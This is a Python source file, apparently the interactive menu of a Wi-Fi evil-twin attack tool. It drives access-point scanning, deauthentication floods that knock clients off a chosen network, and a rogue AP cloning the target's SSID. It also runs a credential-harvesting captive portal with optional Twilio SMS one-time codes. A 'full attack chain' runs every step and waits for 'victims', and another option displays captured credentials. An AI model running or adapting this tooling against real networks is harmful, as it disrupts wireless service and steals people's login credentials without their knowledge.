"""Interactive CLI menu (Section 1, Section 4 #9, #13).

Lifted from the legacy 700-line ``main.py`` so the interactive session
driver stays a single 530-line module. Owns every prompt the user sees
and every command they can pick, but delegates the heavy lifting to
the ``core.*`` modules and just mutates the
:class:`~cli.context.AttackContext`.
"""

from __future__ import annotations

import os
import re
import time
import getpass
import logging
from typing import Optional

# IFNAMSIZ-shaped interface validator (Linux iface names: alphanumeric,
# dashes, underscores, dots, colons allowed in alias portion, ≤16 chars).
# Section 9 hardening: centralised here so callers don't carry their own
# in-function regex import (the previous shape duplicated the import in
# three method bodies — see do_captive_portal / do_network_routing /
# _select_interfaces_for_chain).
_IFACE_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,16}$")

from core.models import AttackState
from core.scanner import APScanner
from core.deauth import DeauthAttack
from core.rogue_ap import RogueAP
from core.network import NetworkConfig, flush_iptables
from core.captive_portal import CaptivePortal
from core.otp_service import (
    OTPServiceInterface,
    DemoOTPService,
    TwilioOTPService,
)
from utils.cleanup import (
    register_cleanup_handler,
    Cleanup,
    request_shutdown,
    is_shutdown_requested,
    reset_shutdown,
    shutdown_event,
)

# Re-export the module-level Event from utils.cleanup so do_full_chain
# waits on the SAME flag that the SIGINT/SIGTERM handler flips —
# ctrl+C now wakes the wait loop instead of leaving it to time out on
# the 1.0s tick.
_shutdown_event = shutdown_event
from utils.monitor_mode import MonitorMode

from cli.context import AttackContext


logger = logging.getLogger("wimirage")

# Cooperative-shutdown event for :meth:`MenuHandler.do_full_chain`.
#
# Security fix S-6 (= quality-sweep fix): the previous version of this
# file shadowed ``_shutdown_event`` with a brand-new ``threading.Event()``
# AFTER importing ``shutdown_event`` from :mod:`utils.cleanup`. That meant
# ``do_full_chain`` blocked on a *different* Event than the SIGINT/SIGTERM
# handler set, so a Ctrl+C wouldn't actually wake the wait loop — it
# would only break on ``timeout=1.0``. Remove the shadow so the import
# alias is the single source of truth. (See utils.cleanup:shutdown_event
# for the canonical instance; ``request_shutdown`` flips it.)


class MenuHandler:
    """All top-level user interactions live here.

    Args:
        ctx: Shared attack context.
    """

    def __init__(self, ctx: AttackContext) -> None:
        self.ctx = ctx

    # ------------------------------------------------------------------
    # Selection helpers
    # ------------------------------------------------------------------

    def select_interface(self, prompt: str, exclude: Optional[list[str]] = None) -> Optional[str]:
        """Prompt the user to pick a wireless interface.

        Args:
            prompt: Heading shown above the list.
            exclude: Interface names to omit from the list.

        Returns:
            The selected interface name, or ``None`` if nothing was picked.
        """
        interfaces = MonitorMode.get_wireless_interfaces()
        if exclude:
            interfaces = [i for i in interfaces if i not in exclude]

        if not interfaces:
            print("[-] No wireless interfaces found.")
            return None

        print(f"\n{prompt}")
        for idx, iface in enumerate(interfaces, 1):
            mode = "Monitor" if MonitorMode.is_monitor_mode(iface) else "Managed"
            exists = "OK" if MonitorMode.interface_exists(iface) else "MISSING"
            print(f"  {idx}. {iface} ({mode}) [{exists}]")

        try:
            choice = int(input("\nSelect interface #: "))
            if 0 < choice <= len(interfaces):
                selected = interfaces[choice - 1]
                if not MonitorMode.interface_exists(selected):
                    print(f"[-] Interface {selected} does not exist in /sys/class/net/.")
                    return None
                return selected
        except (ValueError, IndexError):
            pass
        except EOFError:
            print("\n[-] Input ended.")
            return None

        print("[-] Invalid selection.")
        return None

    def get_otp_service(self) -> Optional[OTPServiceInterface]:
        """Prompt the user to pick a OTP delivery backend.

        Returns:
            A configured ``DemoOTPService``/``TwilioOTPService`` instance, or
            ``None`` if the user picked `n` or Twilio creds were incomplete.
        """
        print("\n  OTP Service:")
        print("  d = Demo (OTP printed to terminal)")
        print("  t = Twilio (real SMS)")
        print("  n = None (auto-verify)")
        otp_choice = input("  Select (d/t/n): ").strip().lower()

        if otp_choice == "d":
            return DemoOTPService(
                otp_length=self.ctx.config.otp_length,
                expiry_seconds=self.ctx.config.otp_expiry_seconds,
                max_attempts=self.ctx.config.otp_max_attempts,
                lockout_seconds=self.ctx.config.otp_lockout_seconds,
            )
        if otp_choice == "t":
            sid = os.environ.get("TWILIO_SID") or input("  Twilio Account SID: ").strip()
            token = os.environ.get("TWILIO_TOKEN") or getpass.getpass("  Twilio Auth Token: ")
            token_confirm = getpass.getpass("  Confirm token: ")
            if token != token_confirm:
                logger.error("Twilio tokens did not match.")
                print("[-] Tokens did not match. Aborting Twilio setup.")
                return None
            from_phone = os.environ.get("TWILIO_PHONE") or input("  Twilio Phone Number: ").strip()
            if not all([sid, token, from_phone]):
                print("[-] Twilio credentials incomplete. Falling back to demo mode.")
                return None
            # Section 9 hygiene: don't write the token back into
            # ``os.environ`` — TwilioOTPService takes creds as
            # constructor args, so the env write was a leak vector
            # (any subprocess the operator spawns after this point
            # would inherit the token in its environment). Cleanup
            # is the test's responsibility; production code never
            # re-reads these env vars after this branch.
            return TwilioOTPService(
                account_sid=sid,
                auth_token=token,
                from_phone=from_phone,
                otp_length=self.ctx.config.otp_length,
                expiry_seconds=self.ctx.config.otp_expiry_seconds,
                max_attempts=self.ctx.config.otp_max_attempts,
                lockout_seconds=self.ctx.config.otp_lockout_seconds,
            )
        return None

    # ------------------------------------------------------------------
    # Menu actions
    # ------------------------------------------------------------------

    def do_scan(self) -> None:
        """Menu option 1: enable monitor mode and run a scan."""
        self.ctx.mon_interface = self.select_interface(
            "Select interface for scanning (monitor mode):"
        )
        if not self.ctx.mon_interface:
            return

        result = MonitorMode.enable_monitor(self.ctx.mon_interface)
        if not result:
            return

        self.ctx.mon_interface = result
        self.ctx.transition(AttackState.SCANNING)

        self.ctx.scanner = APScanner(
            self.ctx.mon_interface, timeout=self.ctx.config.scan_timeout
        )
        scan_result = self.ctx.scanner.scan()
        aps = getattr(scan_result, "aps", None) or []
        self.ctx.scanner.display_aps(aps)

        if aps:
            print(f"\n[+] Found {len(aps)} access points.")
            self.ctx.transition(AttackState.SCANNED)
        else:
            print("[-] No access points found.")
            self.ctx.transition(AttackState.IDLE)

    def do_select_target(self) -> None:
        """Menu option 2: pick a target AP from the previously scanned list."""
        if not self.ctx.scanner or not self.ctx.scanner.ap_list:
            print("[-] Run a scan first (option 1).")
            return

        aps = self.ctx.scanner.get_sorted_aps()
        self.ctx.scanner.display_aps(aps)

        try:
            idx = int(input("\nSelect target AP #: "))
            self.ctx.target_ap = self.ctx.scanner.select_ap(aps, idx)
            if self.ctx.target_ap:
                self.ctx.transition(AttackState.TARGET_SELECTED)
        except (ValueError, IndexError):
            print("[-] Invalid selection.")
        except EOFError:
            print("\n[-] Input ended.")

    def do_deauth(self) -> None:
        """Menu option 3: start a deauth attack against the chosen AP."""
        if not self.ctx.target_ap:
            print("[-] Select a target AP first (option 2).")
            return

        if not self.ctx.mon_interface:
            self.ctx.mon_interface = self.select_interface(
                "Select interface for deauth (monitor mode):"
            )
            if not self.ctx.mon_interface:
                return
            result = MonitorMode.enable_monitor(self.ctx.mon_interface)
            if result:
                self.ctx.mon_interface = result

        self.ctx.deauth = DeauthAttack(
            interface=self.ctx.mon_interface,
            target_bssid=self.ctx.target_ap.bssid,
            target_channel=self.ctx.target_ap.channel,
        )

        print("\n  Deauth Mode:")
        print("  1. Broadcast (disconnect all clients)")
        print("  2. Targeted (specific client)")
        mode = input("  Select mode (1/2): ").strip()

        if mode == "2":
            clients = (
                self.ctx.scanner.get_clients(self.ctx.target_ap.bssid)
                if self.ctx.scanner
                else []
            )
            if clients:
                print("\n  Connected clients:")
                for i, c in enumerate(clients, 1):
                    print(f"    {i}. {c}")
                try:
                    cidx = int(input("  Select client #: "))
                    if 0 < cidx <= len(clients):
                        self.ctx.deauth.client_mac = clients[cidx - 1]
                    else:
                        print("[-] Invalid. Using broadcast mode.")
                except (ValueError, IndexError):
                    print("[-] Invalid. Using broadcast mode.")
            else:
                print("[!] No clients found. Using broadcast mode.")

        pps = input(
            f"  Packets per second (default {self.ctx.config.deauth_pps}): "
        ).strip()
        if pps.isdigit() and int(pps) > 0:
            self.ctx.deauth.pps = int(pps)

        self.ctx.deauth.start()
        self.ctx.transition(AttackState.DEAUTH_RUNNING)
        print("[+] Deauth attack running.")

    def do_rogue_ap(self) -> None:
        """Menu option 4: stand up the rogue AP."""
        if not self.ctx.target_ap:
            print("[-] Select a target AP first (option 2).")
            return

        self.ctx.ap_interface = self.select_interface(
            "Select interface for Rogue AP:",
            exclude=[self.ctx.mon_interface] if self.ctx.mon_interface else [],
        )
        if not self.ctx.ap_interface:
            return

        self.ctx.rogue_ap = RogueAP(
            interface=self.ctx.ap_interface,
            ssid=self.ctx.target_ap.ssid,
            channel=self.ctx.target_ap.channel,
            gateway=self.ctx.config.gateway,
            dhcp_range=self.ctx.config.dhcp_range,
            process_manager=self.ctx.process_manager,
        )
        if self.ctx.rogue_ap.start():
            self.ctx.transition(AttackState.AP_RUNNING)
            if self.ctx.cleaner:
                self.ctx.cleaner.interfaces.append(self.ctx.ap_interface)

    def do_captive_portal(self) -> None:
        """Menu option 5: configure iptables and start the captive portal."""
        # Security fix S-8 (input validation): the iface string flows into
        # subprocess calls (ip / iptables / ifconfig). Without a regex the
        # operator could shell-inject via the prompt. Linux iface names are
        # capped at IFNAMSIZ=16 chars, alphanumeric, dashes, underscores,
        # dots, and colons (only inside the trailing ":alias" portion).
        self.ctx.internet_interface = input(
            "  Enter internet-facing interface (e.g., eth0): "
        ).strip()
        if not self.ctx.internet_interface:
            self.ctx.internet_interface = "eth0"
        elif not _IFACE_RE.match(self.ctx.internet_interface):
            print(f"[-] Invalid interface name: {self.ctx.internet_interface!r}.")
            return

        otp_service = self.get_otp_service()

        if not self.ctx.ap_interface:
            self.ctx.ap_interface = self.select_interface(
                "Select AP interface:",
                exclude=[self.ctx.mon_interface] if self.ctx.mon_interface else [],
            )
        if not self.ctx.ap_interface:
            return

        self.ctx.network = NetworkConfig(
            internet_interface=self.ctx.internet_interface,
            ap_interface=self.ctx.ap_interface,
            portal_port=self.ctx.config.portal_port,
            gateway=self.ctx.config.gateway,
        )
        self.ctx.network.setup_iptables()

        self.ctx.portal = CaptivePortal(
            config=self.ctx.config,
            otp_service=otp_service,
            network_config=self.ctx.network,
            event_bus=self.ctx.event_bus,
            logger_instance=self.ctx.cred_logger,
        )
        self.ctx.portal.start()
        self.ctx.transition(AttackState.PORTAL_RUNNING)

    def do_network_routing(self) -> None:
        """Menu option 6: set up iptables NAT/forwarding without starting the portal."""
        if not self.ctx.ap_interface:
            self.ctx.ap_interface = self.select_interface(
                "Select AP interface:",
                exclude=[self.ctx.mon_interface] if self.ctx.mon_interface else [],
            )
        if not self.ctx.ap_interface:
            return

        self.ctx.internet_interface = input(
            "  Enter internet-facing interface (e.g., eth0): "
        ).strip()
        if not self.ctx.internet_interface:
            self.ctx.internet_interface = "eth0"
        if not _IFACE_RE.match(self.ctx.internet_interface):
            print(f"[-] Invalid interface name: {self.ctx.internet_interface!r}.")
            return

        self.ctx.network = NetworkConfig(
            internet_interface=self.ctx.internet_interface,
            ap_interface=self.ctx.ap_interface,
            portal_port=self.ctx.config.portal_port,
        )
        self.ctx.network.setup_iptables()

    # ------------------------------------------------------------------
    # Full chain — decomposed into helpers (Section 1 #9, Section 4 #9)
    # ------------------------------------------------------------------

    def _select_interfaces_for_chain(self) -> bool:
        """Prompt for mon / ap / internet interfaces. Returns True if all OK."""
        self.ctx.mon_interface = self.select_interface(
            "Select interface for deauth (monitor mode):"
        )
        if not self.ctx.mon_interface:
            return False
        result = MonitorMode.enable_monitor(self.ctx.mon_interface)
        if not result:
            return False
        self.ctx.mon_interface = result

        self.ctx.ap_interface = self.select_interface(
            "Select interface for Rogue AP:", exclude=[self.ctx.mon_interface]
        )
        if not self.ctx.ap_interface:
            return False

        self.ctx.internet_interface = input(
            "  Internet-facing interface (e.g., eth0): "
        ).strip()
        if not self.ctx.internet_interface:
            self.ctx.internet_interface = "eth0"
        if not _IFACE_RE.match(self.ctx.internet_interface):
            print(f"[-] Invalid interface name: {self.ctx.internet_interface!r}.")
            return False
        return True

    def _wait_for_deauth(self, max_seconds: int = 5) -> None:
        """Wait up to ``max_seconds`` for the deauth thread to send >=10 packets."""
        logger.info("Waiting for deauth to take effect...")
        start_wait = time.monotonic()
        while time.monotonic() - start_wait < max_seconds:
            if self.ctx.deauth and self.ctx.deauth.packets_sent > 10:
                return
            time.sleep(0.2)
        logger.warning(
            f"Deauth did not send packets within {max_seconds}s, continuing anyway..."
        )

    def _launch_rogue_ap(self) -> bool:
        """Construct + start ``RogueAP``. Returns True on success."""
        self.ctx.rogue_ap = RogueAP(
            interface=self.ctx.ap_interface,
            ssid=self.ctx.target_ap.ssid,
            channel=self.ctx.target_ap.channel,
            gateway=self.ctx.config.gateway,
            dhcp_range=self.ctx.config.dhcp_range,
            process_manager=self.ctx.process_manager,
        )
        return self.ctx.rogue_ap.start()

    def _configure_network(self) -> bool:
        """Build the :class:`NetworkConfig` + install iptables. Returns True on success."""
        self.ctx.network = NetworkConfig(
            internet_interface=self.ctx.internet_interface,
            ap_interface=self.ctx.ap_interface,
            portal_port=self.ctx.config.portal_port,
            gateway=self.ctx.config.gateway,
        )
        return self.ctx.network.setup_iptables()

    def _launch_portal(self, otp_service: Optional[OTPServiceInterface]) -> None:
        """Construct + start the captive portal."""
        self.ctx.portal = CaptivePortal(
            config=self.ctx.config,
            otp_service=otp_service,
            network_config=self.ctx.network,
            event_bus=self.ctx.event_bus,
            logger_instance=self.ctx.cred_logger,
        )
        self.ctx.portal.start()

    def do_full_chain(self) -> None:
        """Menu option 7: end-to-end attack — scan, deauth, AP, portal."""
        print("\n\033[93m[*] Full Attack Chain\033[0m")

        if not self._select_interfaces_for_chain():
            self.ctx.transition(AttackState.IDLE)
            return

        self.ctx.scanner = APScanner(
            self.ctx.mon_interface, timeout=self.ctx.config.scan_timeout
        )
        self.ctx.transition(AttackState.SCANNING)
        scan_result = self.ctx.scanner.scan()
        # scan() now returns a ScanResult (Section 2 #7) — display_aps()
        # takes a list[AccessPoint]; pull `.aps` off the result.
        aps = getattr(scan_result, "aps", None) or []
        self.ctx.scanner.display_aps(aps)

        if not aps:
            print("[-] No APs found.")
            self.ctx.transition(AttackState.IDLE)
            return

        self.ctx.transition(AttackState.SCANNED)

        try:
            idx = int(input("\nSelect target AP #: "))
            self.ctx.target_ap = self.ctx.scanner.select_ap(aps, idx)
        except (ValueError, IndexError):
            print("[-] Invalid selection.")
            self.ctx.transition(AttackState.IDLE)
            return
        except EOFError:
            print("\n[-] Input ended.")
            self.ctx.transition(AttackState.IDLE)
            return

        if not self.ctx.target_ap:
            self.ctx.transition(AttackState.IDLE)
            return

        self.ctx.transition(AttackState.TARGET_SELECTED)

        otp_service = self.get_otp_service()

        self.ctx.cleaner = register_cleanup_handler(
            interfaces=[self.ctx.mon_interface, self.ctx.ap_interface],
            internet_interface=self.ctx.internet_interface,
        )

        self.ctx.deauth = DeauthAttack(
            interface=self.ctx.mon_interface,
            target_bssid=self.ctx.target_ap.bssid,
            target_channel=self.ctx.target_ap.channel,
        )
        self.ctx.deauth.start()
        self.ctx.transition(AttackState.DEAUTH_RUNNING)

        self._wait_for_deauth()

        if not self._launch_rogue_ap():
            self.ctx.transition(AttackState.IDLE)
            return
        self.ctx.transition(AttackState.AP_RUNNING)

        if not self._configure_network():
            self.ctx.transition(AttackState.IDLE)
            return

        self._launch_portal(otp_service)
        self.ctx.transition(AttackState.FULL_ATTACK)

        print("\n\033[92m[+] Full attack chain is running!")
        print("[+] Deauth: ACTIVE | Rogue AP: ACTIVE | Portal: ACTIVE")
        print("[+] Waiting for victims to connect...\033[0m")
        print("[+] Press Ctrl+C to stop and cleanup.\n")

        # Cooperative shutdown via Event instead of busy-wait (Section 4 #9)
        try:
            while not _shutdown_event.wait(timeout=1.0):
                pass
        except KeyboardInterrupt:
            pass

    def do_view_credentials(self) -> None:
        """Menu option 8: dump captured credentials + a summary."""
        self.ctx.cred_logger.display_all()
        self.ctx.cred_logger.display_summary()

    def do_stop_all(self) -> None:
        """Menu option 9: tear down every active subsystem and go IDLE."""
        if self.ctx.deauth:
            self.ctx.deauth.stop()
            self.ctx.deauth = None
        if self.ctx.rogue_ap:
            self.ctx.rogue_ap.stop()
            self.ctx.rogue_ap = None
        if self.ctx.network:
            self.ctx.network.cleanup()
            self.ctx.network = None
        if self.ctx.portal:
            self.ctx.portal.stop()
            self.ctx.portal = None
        if self.ctx.cleaner:
            self.ctx.cleaner.kill_background_processes()
            flush_iptables()
            self.ctx.cleaner.disable_ip_forwarding()

        self.ctx.transition(AttackState.IDLE)
        print("[+] All attacks stopped.")

    def do_exit(self) -> None:
        """Menu option 0: clean up and exit the program."""
        print("\n[*] Exiting...")
        if self.ctx.deauth:
            self.ctx.deauth.stop()
        if self.ctx.rogue_ap:
            self.ctx.rogue_ap.stop()
        if self.ctx.network:
            self.ctx.network.cleanup()
        if self.ctx.cleaner:
            self.ctx.cleaner.cleanup_all()
        elif self.ctx.mon_interface or self.ctx.ap_interface:
            cleanup = Cleanup(
                interfaces=[
                    i for i in [self.ctx.mon_interface, self.ctx.ap_interface] if i
                ]
            )
            cleanup.cleanup_all()
        print("[+] Goodbye!")

    # ------------------------------------------------------------------
    # Menu loop
    # ------------------------------------------------------------------

    def display_menu(self) -> None:
        """Print the main menu and current state to stdout."""
        print("\n" + "=" * 50)
        print("  MAIN MENU")
        print("=" * 50)
        print(f"  State: {self.ctx.state.name}")
        print("=" * 50)
        print("  1. Scan for Access Points")
        print("  2. Select Target AP")
        print("  3. Start Deauth Attack")
        print("  4. Launch Evil Twin (Rogue AP)")
        print("  5. Start Captive Portal")
        print("  6. Configure Network Routing")
        print("  7. Run Full Attack Chain")
        print("  8. View Captured Credentials")
        print("  9. Stop All")
        print("  0. Exit")
        print("=" * 50)

    def run(self) -> None:
        """Main interactive loop. Dispatches menu choices until exit."""
        while True:
            self.display_menu()
            try:
                choice = input("\nSelect option: ").strip()
            except EOFError:
                self.do_exit()
                break
            except KeyboardInterrupt:
                print()
                self.do_exit()
                break

            actions = {
                "1": self.do_scan,
                "2": self.do_select_target,
                "3": self.do_deauth,
                "4": self.do_rogue_ap,
                "5": self.do_captive_portal,
                "6": self.do_network_routing,
                "7": self.do_full_chain,
                "8": self.do_view_credentials,
                "9": self.do_stop_all,
                "0": self.do_exit,
            }

            action = actions.get(choice)
            if action:
                action()
                if choice == "0":
                    break
            else:
                print("[-] Invalid option.")


__all__ = ["MenuHandler"]
